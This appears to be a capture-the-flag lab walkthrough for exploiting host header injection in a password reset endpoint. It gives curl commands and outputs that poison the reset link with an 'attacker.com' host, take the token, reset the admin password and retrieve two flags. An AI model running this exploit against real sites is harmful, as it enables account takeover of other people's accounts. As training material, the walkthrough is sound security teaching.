# Walkthrough: Host Header Injection

## Setup

```bash
docker compose up --build -d
```

Wait for `Listening on http://0.0.0.0:8080` in the logs, then proceed.

## Step 1: Confirm the Vulnerability Exists

Send a normal reset request and check the email:

```bash
curl -s -X POST http://127.0.0.1:8090/reset-password \
    -H "Content-Type: application/json" \
    -d '{"email": "admin@lab.internal"}'
```

Output:

```json
{"message": "If that email exists, a reset link has been sent."}
```

```bash
curl -s http://127.0.0.1:8090/debug/last-email
```

Output:

```json
{
  "to": "admin@lab.internal",
  "subject": "Password Reset",
  "body": "Click here: http://127.0.0.1:8090/reset?token=4a2b..."
}
```

The link uses `127.0.0.1:8090` from the original `Host` header.

## Step 2: Inject a Custom Host

```bash
curl -s -X POST http://127.0.0.1:8090/reset-password \
    -H "Content-Type: application/json" \
    -H "Host: attacker.com" \
    -d '{"email": "admin@lab.internal"}'
```

```bash
curl -s http://127.0.0.1:8090/debug/last-email
```

Output:

```json
{
  "to": "admin@lab.internal",
  "subject": "Password Reset",
  "body": "Click here: http://attacker.com/reset?token=9f1c3..."
}
```

The token `9f1c3...` is now embedded in a link pointing to `attacker.com`. In a real attack, the victim clicks this link and the token appears in the attacker's server logs. Here, we read it from the debug endpoint.

## Step 3: Reset the Admin Password

```bash
TOKEN="9f1c3..."   # paste the full 32-hex token from the email body
curl -s "http://127.0.0.1:8090/reset?token=${TOKEN}&password=hacked123"
```

Output:

```json
{"message": "Password has been reset."}
```

## Step 4: Log In as Admin

```bash
curl -s -c /tmp/cookies.txt -b /tmp/cookies.txt \
    -X POST http://127.0.0.1:8090/login \
    -H "Content-Type: application/json" \
    -d '{"username":"admin","password":"hacked123"}'
```

Output (flag 1 in the `flag` field):

```json
{"flag": "POC{...}", "message": "Logged in as admin"}
```

## Step 5: Get Flag 2

```bash
curl -s -c /tmp/cookies.txt -b /tmp/cookies.txt \
    http://127.0.0.1:8090/admin-data
```

Output (flag 2 in the `secret` field):

```json
{"secret": "POC{...}"}
```

## Teardown

```bash
docker compose down
```
